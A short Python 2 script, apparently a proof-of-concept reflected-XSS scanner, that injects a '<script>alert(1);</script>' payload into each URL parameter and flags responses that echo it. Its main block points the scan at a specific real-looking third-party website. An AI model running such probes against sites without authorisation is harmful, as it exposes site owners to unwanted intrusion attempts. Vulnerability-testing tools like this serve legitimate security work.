#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @Time    : 2017/2/12 1:28
# @Author  : CoLoDoo
# @Site    : 
# @File    : poc_xss_test.py
# @Software: PyCharm

from tool.poc_tool import PocTool as tool
from log.log_console import LogConsole as logs
import sys
reload(sys)
sys.setdefaultencoding('utf-8')

def check_xss(url=''):
    '''
    描述:
        检测方法xss方法
    参数:
        url=''
    返回:
        result_urls=[]
    '''
    result_urls = []
    if url != '':
        xss = tool(url)
        values = xss.get_send_values()
        for value in values:
            key = value[0]
            content = value[1]
            tmp_url = str(xss.url).replace(content, '<script>alert(1);</script>')
            req = xss.get_request(url=tmp_url)
            res = req.content
            if xss.check_key_in_value('alert(1)', res):
                result_urls.append(tmp_url)
        for result_url in result_urls:
            # print '[+] ' + result_url
            logs().print_log(result_url, 'ok')
        return result_urls
    else:
        return 'url is null'

def attack(url='', postData=''):
    pass

if __name__ == '__main__':
    help(check_xss)
    check_xss(url='http://www.zengyf.com/index_comic_show2.action?id=258&page=1&title=就叫薏米好了')

